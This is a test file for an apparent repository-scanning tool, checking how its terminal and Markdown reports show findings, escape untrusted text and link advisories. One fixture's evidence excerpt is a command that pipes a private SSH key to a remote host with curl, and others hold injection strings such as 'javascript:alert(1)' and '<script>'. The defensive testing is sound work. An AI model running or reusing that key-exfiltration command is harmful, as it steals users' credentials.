"""Rendering a report with findings, ready for M2 onwards."""

import io
from datetime import UTC, datetime

from lookfirst.verdict.render_markdown import md_code, md_text, render_markdown
from lookfirst.verdict.render_terminal import make_console, render_terminal
from lookfirst.verdict.schema import CheckKind, Evidence, Finding, NotChecked, Severity, Target
from lookfirst.verdict.scoring import build_report


def sample_report():
    findings = [
        Finding(
            id="install_path.credential_theft",
            check=CheckKind.install_path,
            severity=Severity.critical,
            title="Install script reads your SSH key and sends it out",
            evidence=[
                Evidence(
                    type="file",
                    ref="install.sh",
                    line=12,
                    excerpt="cat ~/.ssh/id_ed25519 | curl -d @- https://x`y|z",
                ),
            ],
            explanation="Scripts that read keys and send them over the network steal access.",
            recommendation="Don't run it.",
        ),
        Finding(
            id="package.known_vulnerability",
            check=CheckKind.package,
            severity=Severity.medium,
            title="A dependency has a known vulnerability",
            explanation="An old version of a library has a published security bug.",
            recommendation="Update it.",
            source="osv-scanner",
            source_version="2.7.0",
        ),
    ]
    return build_report(
        target=Target(kind="github", raw="evil/viral-tool", resolved="evil/viral-tool@" + "b" * 40),
        findings=findings,
        checked=[CheckKind.install_path, CheckKind.package],
        not_checked=[
            NotChecked(
                check=CheckKind.sandbox,
                what="Sandbox dry run",
                reason="not requested",
                how_to_enable="add --sandbox",
            )
        ],
        now=datetime(2026, 11, 6, 12, 0, tzinfo=UTC),
    )


def terminal_text(report) -> str:
    buffer = io.StringIO()
    render_terminal(report, make_console(file=buffer, width=100, color_system=None))
    return buffer.getvalue()


def test_terminal_shows_verdict_reasons_and_details() -> None:
    out = terminal_text(sample_report())
    lines = [line.strip() for line in out.splitlines() if line.strip()]
    assert lines[0] == "Don't run: we found serious warning signs."
    assert lines[1] == "• Install script reads your SSH key and sends it out"
    assert "Skeleton build" not in out
    assert "CRITICAL" in out and "MEDIUM" in out
    assert "Evidence: install.sh line 12" in out
    assert out.index("CRITICAL") < out.index("MEDIUM")
    # Minor findings are folded to their title; the Markdown report has the rest. In a
    # Don't run or Caution report they back up the reasons, so they're "Also found".
    assert "Also found" in lines and "Worth knowing" not in lines
    assert "MEDIUM  A dependency has a known vulnerability" in lines
    assert "An old version of a library" not in out and "Found by osv-scanner" not in out
    assert "Add --report FILE to see every detail." in lines


def test_markdown_shows_verdict_reasons_and_details() -> None:
    md = render_markdown(sample_report())
    assert md.startswith("# lookfirst report: Don't run\n")
    assert "1. Install script reads your SSH key and sends it out" in md
    assert "### CRITICAL: Install script reads your SSH key and sends it out" in md
    # Files link to the exact commit that was checked.
    link = f"https://github.com/evil/viral-tool/blob/{'b' * 40}/install.sh#L12"
    assert f"- Evidence: [`install.sh` line 12](<{link}>)" in md
    # Minor findings keep every detail in Markdown, in their own section.
    assert md.index("## Details") < md.index("## Also found")
    assert "An old version of a library has a published security bug." in md
    assert "- Found by osv-scanner 2.7.0" in md
    assert "| Checked | 2026-11-06 12:00 UTC with lookfirst" in md


def test_markdown_code_spans_cant_be_broken_out_of() -> None:
    assert md_code("a`b") == "``a`b``"
    assert md_code("`edge`") == "`` `edge` ``"
    assert md_code("x|y") == "`x\\|y`"


def test_markdown_text_escapes_links_and_html() -> None:
    assert md_text("[click](https://evil.example)") == "\\[click\\](https://evil.example)"
    assert md_text("<script>") == "\\<script\\>"
    assert md_text("a\u202eb") == "a<U+202E>b"


def package_report():
    from lookfirst.verdict.schema import ToolRun

    vulnerable = Finding(
        id="package.known_vulnerabilities",
        check=CheckKind.package,
        severity=Severity.medium,
        title="Uses 2 package versions with known vulnerabilities",
        evidence=[
            Evidence(
                type="file",
                ref="requirements.txt",
                data={
                    "package": "pyyaml",
                    "version": "5.3",
                    "ecosystem": "PyPI",
                    "worst": 9.8,
                    "fixed": "5.3.1, 5.4",
                    "advisories": "GHSA-6757-jp84-gxfx, PYSEC-2021-142",
                },
            ),
            Evidence(
                type="file",
                ref="sub dir/uv.lock",
                data={"package": "fl|ask", "version": "2.3.3", "advisories": "bad id!", "more": 4},
            ),
        ],
        explanation="These are bugs attackers can use.",
        recommendation="Update them.",
        source="osv-scanner",
        source_version="2.7.0",
    )
    link = Finding(
        id="install_path.unknown_remote_script",
        check=CheckKind.install_path,
        severity=Severity.medium,
        title="Downloads a script from an unknown site",
        evidence=[
            Evidence(type="url", ref="javascript:alert(1)"),
            Evidence(type="url", ref="https://x.example/a b<c>"),
        ],
        explanation="x",
        recommendation="y",
    )
    return build_report(
        target=Target(kind="github", raw="o/r", resolved="o/r@" + "c" * 40),
        findings=[vulnerable, link],
        checked=[CheckKind.package],
        not_checked=[],
        tools=[
            ToolRun(
                name="osv-scanner",
                version="2.7.0",
                status="ran",
                detail="asked osv.dev about 12 package versions (names and versions only)",
            ),
            ToolRun(name="GuardDog", status="not_installed"),
        ],
        now=datetime(2026, 11, 9, 12, 0, tzinfo=UTC),
    )


def test_markdown_lists_vulnerable_packages_as_a_table_with_advisory_links() -> None:
    md = render_markdown(package_report())
    commit = "c" * 40
    assert "| Package | Version | Worst score | Fixed in | Advisories | Where |" in md
    assert (
        "| `pyyaml` | `5.3` | 9.8 | `5.3.1, 5.4` | "
        "[`GHSA-6757-jp84-gxfx`](<https://osv.dev/vulnerability/GHSA-6757-jp84-gxfx>), "
        "[`PYSEC-2021-142`](<https://osv.dev/vulnerability/PYSEC-2021-142>) | "
        f"[`requirements.txt`](<https://github.com/o/r/blob/{commit}/requirements.txt>) |"
    ) in md
    # A | in a name can't split the table; an odd advisory id isn't linked; paths are encoded.
    assert "`fl\\|ask`" in md and "bad id" not in md
    assert f"(<https://github.com/o/r/blob/{commit}/sub%20dir/uv.lock>)" in md
    assert "…and 4 more package versions." in md


def test_markdown_links_only_web_addresses() -> None:
    md = render_markdown(package_report())
    assert "- Evidence: `javascript:alert(1)`" in md  # shown, never a link
    assert "[`https://x.example/a b<c>`](<https://x.example/a%20b%3Cc%3E>)" in md


def test_reports_say_which_tools_ran_and_what_they_sent() -> None:
    sentence = (
        "Also checked with osv-scanner 2.7.0, which asked osv.dev about 12 package versions "
        "(names and versions only)."
    )
    assert sentence in render_markdown(package_report())
    assert sentence in " ".join(terminal_text(package_report()).split())


def test_terminal_folds_minor_findings_to_title_and_place() -> None:
    lines = [line.strip() for line in terminal_text(package_report()).splitlines()]
    assert "Worth knowing" in lines  # a Looks OK report
    i = lines.index("MEDIUM  Uses 2 package versions with known vulnerabilities")
    assert lines[i + 1] == "Worst: pyyaml 5.3 (score 9.8), in requirements.txt"
    assert "Fixed in" not in "\n".join(lines)


def test_terminal_lists_a_file_once_for_several_pieces_of_evidence() -> None:
    finding = Finding(
        id="package.known_malware",
        check=CheckKind.package,
        severity=Severity.critical,
        title="Depends on a package known to be malware",
        evidence=[
            Evidence(type="file", ref="package-lock.json", data={"what": "coa 2.0.3: malware"}),
            Evidence(type="file", ref="package-lock.json", data={"what": "rc 1.2.9: malware"}),
        ],
        explanation="x",
        recommendation="y",
    )
    report = build_report(
        target=Target(kind="local", raw="app", resolved="/x/app"),
        findings=[finding],
        checked=[CheckKind.package],
        not_checked=[],
    )
    out = terminal_text(report)
    assert out.count("Evidence: package-lock.json") == 1
    assert "coa 2.0.3: malware" in out and "rc 1.2.9: malware" in out


def sandbox_report():
    from lookfirst.verdict.schema import SandboxRun

    run = SandboxRun(
        command="npm install\nnpm run build",
        why="the install instructions in README.md (line 8)",
        image_digest="sha256:" + "a" * 64,
        duration_s=1.24,
        exit_code=0,
        network="sinkhole",
        arch="arm64",
        hosts=["registry.npmjs.org", "collect.example.net"],
        files_changed=13,
    )
    return build_report(
        target=Target(kind="local", raw="app", resolved="/x/app"),
        findings=[],
        checked=[CheckKind.sandbox],
        not_checked=[],
        sandbox=run,
    )


def test_reports_describe_the_dry_run() -> None:
    lines = [line.strip() for line in terminal_text(sandbox_report()).splitlines()]
    assert "Sandbox dry run" in lines
    flat = " ".join(" ".join(lines).split())
    assert (
        "Ran npm install (and 1 more line): the install instructions in README.md (line 8)" in flat
    )
    assert "Time 1.2 s, finished normally" in flat
    assert "Touched 13 files changed; contacted registry.npmjs.org, collect.example.net" in flat
    assert "seeing nothing doesn't mean it's safe" in flat
    md = render_markdown(sandbox_report())
    assert "## Sandbox dry run" in md
    assert "| Ran | `npm install (and 1 more line): the install instructions" in md
    assert (
        "| Network | registries and its own sites passed; the sandbox answered every other request |"
        in md
    )
